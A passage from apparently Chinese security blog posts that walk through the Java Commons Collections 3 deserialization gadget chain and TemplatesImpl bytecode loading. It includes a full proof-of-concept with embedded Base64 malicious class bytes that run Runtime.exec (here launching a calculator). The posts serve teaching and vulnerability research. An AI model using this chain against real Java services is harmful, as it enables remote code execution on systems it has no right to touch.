Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //templates.newTransformer();</span><br><span class="line">        </span><br><span class="line">//cc1+cc3</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA-CommonsCollections3/2.jpg"></p><p>但 这不是真正的 CC3 ，CC3的目的是为了绕过CC1的限制，也就是对InvokerTransformer的限制，有些 反序列化的过滤器的黑名单 就有了 InvokerTransformer ，因此CC3真正绕过的是他。</p><p>ysoserial的作者找到了com.sun.org.apache.xalan.internal.xsltc.trax下面的TrAXFilter类，它的构造器非常有意思，调用了newTransformer ，免去了我们手工调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我第一张图所示  ，当然了，缺少了 InvokerTransformer，TrAXFilter的构造⽅法也是⽆法调⽤的，<br>这里会用到一个新的 Transformer ： org.apache.commons.collections.functors.InstantiateTransformer  他的作⽤就是调⽤构造⽅法</p><p>所以 我们实现的目标就是 利用 InstantiateTransformer 去实例化这个 TrAXFilter，使其去自动调用他的构造方法 ，其构造方法就会自动调用 templates.newTransformer()，里面放入我们的字节码，则可利用成功~  妙！</p><h1 id="POC构造分析"><a href="#POC构造分析" class="headerlink" title="POC构造分析"></a>POC构造分析</h1><p>可能很多小伙伴不知道 POC是怎么样的一个流程，自写POC也比较困难，大部分文章讲的也模棱两可，希望这个构造分析对你有所帮助</p><h2 id="构造字节码"><a href="#构造字节码" class="headerlink" title="构造字节码"></a>构造字节码</h2><p>这个大家应该都知道，就是要利用到恶意字节码，也就是要调用 Templatesimpl.newTransformer 去加载我们的恶意字节码，所以我们先构造所需的字节码 byte：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上篇 我们分析过，将字节码 放入bytecodes 中进行加载，再满足一些参数需求则可以利用 成功</p><p>再此之前，思考个问题， JAVA反序列化是否不同于PHP，JAVA的则是先构造出口，也就是从后往前构造，PHP则相反（ 可能只有我这么认为 哈哈哈</p><h2 id="构造InstantiateTransformer与TrAXFilter"><a href="#构造InstantiateTransformer与TrAXFilter" class="headerlink" title="构造InstantiateTransformer与TrAXFilter"></a>构造InstantiateTransformer与TrAXFilter</h2><p>可以看到第一张图，接下来需要构造 TrAXFilter.class 了，因为此类可以调用到 newTransformer()<br>但又因为 利用点是构造器，需要实例化此类才能调用，则 又关联到了另一个类 InstantiateTransformer.class,该类有 TrAXFilter.class 需要的 newInstance() 方法，所以我们构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">    new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">    new InstantiateTransformer(  </span><br><span class="line">        new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">        new Object[]&#123;templates&#125;  </span><br><span class="line">    )  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);</span><br></pre></td></tr></table></figure><p>Transformer大家都知道，接着 new InstantiateTransformer()传入这里进行了 有参构造：</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/4.jpg"></p><p>接着调用 transform方法</p><p>此时的 con&#x3D;TrAXFilter.class.getConstructor(templates)， 然后这里的IAgs 是我们的字节码~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/3.jpg"></p><p>紧接着就能 newInstance() -&gt;newTransformer()</p><p>接下来就是拼接 CC1 连接 InstantiateTransformer.class这段了，到了这块，就很简单了，就给Map设置几个基础值就好了。</p><p>这里直接贴了，就不做过多讲解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">outmap.put(&quot;test&quot;,&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><p>完整POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class POC &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] trueTransformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;)),  </span><br><span class="line">            new InstantiateTransformer(  </span><br><span class="line">                new Class[]&#123;Templates.class&#125;,  </span><br><span class="line">                new Object[]&#123;templates&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outmap = TransformedMap.decorate(innerMap, null, chainedTransformer);  </span><br><span class="line">        outmap.put(&quot;test&quot;,&quot;xxx&quot;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/16/JAVA-CommonsCollections3/exc.jpg"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA动态加载字节码</title>
      <link href="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是JAVA的字节码？"><a href="#什么是JAVA的字节码？" class="headerlink" title="什么是JAVA的字节码？"></a>什么是JAVA的字节码？</h1><p>字节码 其实指的是Java虚拟机运行执行的指令，通过编译后，通常被储存在  .class   文件中。<br>因为语言是跨平台的，其他语言可以通过编译成  .class  文件后，在Java虚拟机中运行~<br>但本文想要说的是字节码 可以将.class 文件 恢复成一个类，在Jvm虚拟机中加载。</p><h1 id="利用URLClassLoader-加载远程文件"><a href="#利用URLClassLoader-加载远程文件" class="headerlink" title="利用URLClassLoader 加载远程文件"></a>利用URLClassLoader 加载远程文件</h1><p>正常情况下 会以 三种情况来寻找  .class 文件 ：</p><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul><p>如果是非 file 协议的情况下，最常见使用的协议 则是  http 协议</p><p>接下来测试一下在JAVA中是否能够从远程 HTTP 中加载 .class 文件：</p><p>起一个测试文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">import java.net.URLClassLoader;  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;  </span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;  </span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);  </span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);  </span><br><span class="line">        c.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hello.java:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">public class Hello &#123;  </span><br><span class="line">    public Hello() throws IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(&quot;Hello World&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 Hello.java 编译成 .class 文件 并在本目录起个 Python 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/1.png" alt="one"></p><p>成功请求到 Hello.class 并执行了其中的字节码 输出Hello World，如果能控制目标 Java ClassLoader的路径作为一个http服务器，则可以利用远程加载的方式执行任意代码。</p><h1 id="利用ClassLoader-define加载远程字节码"><a href="#利用ClassLoader-define加载远程字节码" class="headerlink" title="利用ClassLoader#define加载远程字节码"></a>利用ClassLoader#define加载远程字节码</h1><p>无论是加载远程文件 还是本地的 jar  或 .class  都会经过三个方法的调用。</p><p>通俗的分类：</p><ul><li>loadClass 在本地类缓存中、夫加载器中寻找类，如没有找到，则执行 findClass</li><li>findClass 根据基础 URL指定的方式 来加载类的字节码 然后交给 defineClass</li><li>defineClass 处理前面传入的字节码，将其处理成真正的Java类</li></ul><p>可见核心是 defineClass  他的行为就是将字节码的形式转换成一个Java类。</p><p>在  defineClass   调用时，类对象是不会被初始化的，只有这个对象 显式 的调用 构造函数  初始化代码才会执行，即使是放入static 块中。  ClassLoader 类中的 defineClass  是个  protected  属性，所以如果我们想要使用  defineClass  则需要使用  反射  来调用 ,这个  defineClass   是  TemplateImpl  攻击链的重点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">        defineClass.setAccessible(true);  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);  </span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);  </span><br><span class="line">        hello.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用TemplatesImpl进行加载字节码"><a href="#利用TemplatesImpl进行加载字节码" class="headerlink" title="利用TemplatesImpl进行加载字节码"></a>利用TemplatesImpl进行加载字节码</h1><p>底层链 运用到了 我们的主角  defineClass   ~  </p><p>依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>本来不想跟链子的，之前也审过没发出来，  但作为本篇的第一篇 还是跟一下吧</p><p>在   TemplatesImpl   的  TransletClassLoader  重载了  defineClass   方法 ，有点长，去头去尾贴出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;  </span><br><span class="line">    private final Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;  </span><br><span class="line">        Class&lt;?&gt; ret = null;  </span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the  </span><br><span class="line">        // SecurityManager is not set and the FSP is turned off        if (_loadedExternalExtensionFunctions != null) &#123;  </span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        if (ret   null) &#123;  </span><br><span class="line">            ret = super.loadClass(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        return ret;  </span><br><span class="line">     &#125;  </span><br><span class="line">    </span><br><span class="line">     Class&lt;?&gt; defineClass(final byte[] b) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; defineClass(final byte[] b, ProtectionDomain pd) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length, pd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 defineClass  没有写明类型，默认为default 所以只能被内部调用。</p><p>再跟进谁调用了 此  defineClass(x,y)  在 defineTransletClasses() 中发现 ：</p><p>代码很长 只贴部分<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/2.png" alt="one"></p><p>调用了 两个形参的 defineClass ，再紧接着 跟进谁调用了  defineTransletClasses ，发现是   getTransletInstance </p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/3.png" alt="one"></p><p>再向上取   newTransformer  调用了  getTransletInstance   而newTransformer 又被getOutputProperties调用 ，至此结束，并且  newTransformer  和  getOutputProperties 是一个public 的类型，可以被外部调用。</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/4.png" alt="one"></p><p>调用链为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道了 调用链，就要开始满足 其调用的传参，也就是构成exp 的细节 从调用链的开头来设计参数，从  newTransformer  开始 ：</p><p>调用了   getTransletInstance()  且不需要传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()  </span><br><span class="line">    throws TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p> getTransletInstance() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()  </span><br><span class="line">    throws TransformerConfigurationException &#123;  </span><br><span class="line">    try &#123;  </span><br><span class="line">        if (_name   null) return null;  </span><br><span class="line">  </span><br><span class="line">        if (_class   null) defineTransletClasses();</span><br></pre></td></tr></table></figure><p>这里需要满足  name 和 class  不为 null，  才会调用  defineTransletClasses()<br>这里的两个值 都是保护属性，所以我们需要反射 暴力修改其值，不过都是后话<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/5.png" alt="one"></p><p>来到  defineTransletClasses()  看到前面有个判断<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/6.png" alt="one"></p><p>这里的 bytecodes 需要不为null 才能继续往下走，那么我们到这就是要设 3个值了</p><p>此处 的 loader.defineClass(bytecodes[i])  可以看出 bytecodes 就是我们要加载的 字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; classCount; i++) &#123;  </span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i], pd);  </span><br><span class="line">    final Class&lt;?&gt; superClass = _class[i].getSuperclass();</span><br></pre></td></tr></table></figure><p>但在中间还有个坑  那就是在中间会执行 run() 方法：</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/7.png" alt="one"></p><p>调用的是   tfactory.getExternalExtensionsMap()   跟进后，发现getExternalExtensionsMap()是TransformerFactoryImpl类<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/8.png" alt="one"></p><p>构造  tfactory  为  TransformerFactoryImpl  